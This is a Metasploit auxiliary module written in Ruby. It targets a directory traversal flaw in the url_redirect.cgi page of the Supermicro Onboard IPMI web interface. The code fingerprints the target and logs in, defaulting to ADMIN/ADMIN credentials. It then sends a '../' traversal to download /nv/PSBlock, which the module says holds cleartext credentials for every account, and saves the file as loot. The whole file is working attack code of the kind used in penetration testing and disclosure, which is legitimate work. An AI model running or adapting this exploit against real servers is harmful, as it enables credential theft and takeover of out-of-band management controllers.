##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Supermicro Onboard IPMI Directory Taversal',
      'Description' => %q{
        This module abuses a directory traversal on the web interface for Supermicro Onboard IPMI. The
        vulnerability exists in the url_redirect.cgi CGI application, due to a lack of sanitization
        of the url_name parameter. This may allow an attacker with a valid, but not necessarily
        administrator-level account, to access the contents of any file on the system. This includes
        the /nv/PSBlock file, which contains the cleartext credentials for all configured accounts.
        This module has been tested on Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware SMT_X9_214.
      },
      'Author'       =>
        [
          'hdm', # Discovery and Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          #[ 'CVE', '' ],
          #[ 'URL', '' ] # Use R7 blog post
        ],
      'DisclosureDate' => 'Nov 06 2013'))

    register_options(
      [
        OptString.new('FILEPATH', [true, 'The name of the file to download', '/nv/PSBlock']),
        OptInt.new('DEPTH', [true, 'Traversal depth', 1]), # By default downloads from /tmp
        OptString.new('USERNAME', [true, 'Username for Supermicro Web Interface', 'ADMIN']),
        OptString.new('PASSWORD', [true, 'Password for Supermicro Web Interface', 'ADMIN'])
      ], self.class)
  end

  def my_basename(filename)
    return ::File.basename(filename.gsub(/\\/, "/"))
  end

  def is_supermicro?
    res = send_request_cgi(
      {
        "uri"       => "/",
        "method"    => "GET"
      })

    if res and res.code == 200 and res.body =~ /ATEN International Co Ltd\./
      return true
    else
      return false
    end
  end

  def login
    res = send_request_cgi({
      "uri"       => "/cgi/login.cgi",
      "method"    => "POST",
      "vars_post" => {
        "name" => datastore["USERNAME"],
        "pwd"  => datastore["PASSWORD"]
      }
    })

    if res and res.code == 200 and res.body =~ /self.location="\.\.\/cgi\/url_redirect\.cgi/ and res.headers["Set-Cookie"] =~ /(SID=[a-z]+)/
      return $1
    else
      return nil
    end
  end

  def read_file(file, session)
    travs = ""
    travs << "../" * datastore['DEPTH']
    travs << file

    print_status("#{peer} - Retrieving file contents...")

    res = send_request_cgi({
      "uri"           => "/cgi/url_redirect.cgi",
      "method"        => "GET",
      "cookie"        => session,
      "encode_params" => false,
      "vars_get"      => {
        "url_type" => "file",
        "url_name" => travs
      }
    })

    if res and res.code == 200 and res.headers["Content-type"] =~ /text\/html/ and res.headers["Pragma"].nil?
      return res.body
    else
      return nil
    end
  end

  def run
    print_status("#{peer} - Checking if it's a Supermicro web interface...")
    if is_supermicro?
      print_good("#{peer} - Check successful")
    else
      print_error("#{peer} - Supermicro web interface not found")
      return
    end

    print_status("#{peer} - Login into the Supermicro web interface...")
    session = login
    if session.nil?
      print_error("#{peer} - Failed to login, check credentials.")
      return
    else
      print_good("#{peer} - Login successful, session: #{session}")
    end

    contents = read_file(datastore['FILEPATH'], session)
    if contents.nil?
      print_error("#{peer} - File not downloaded")
      return
    end

    file_name = my_basename(datastore['FILEPATH'])
    path = store_loot(
      'supermicro.ipmi.traversal',
      'application/octet-stream',
      rhost,
      contents,
      file_name
    )
    print_good("#{peer} - File saved in: #{path}")
  end

end
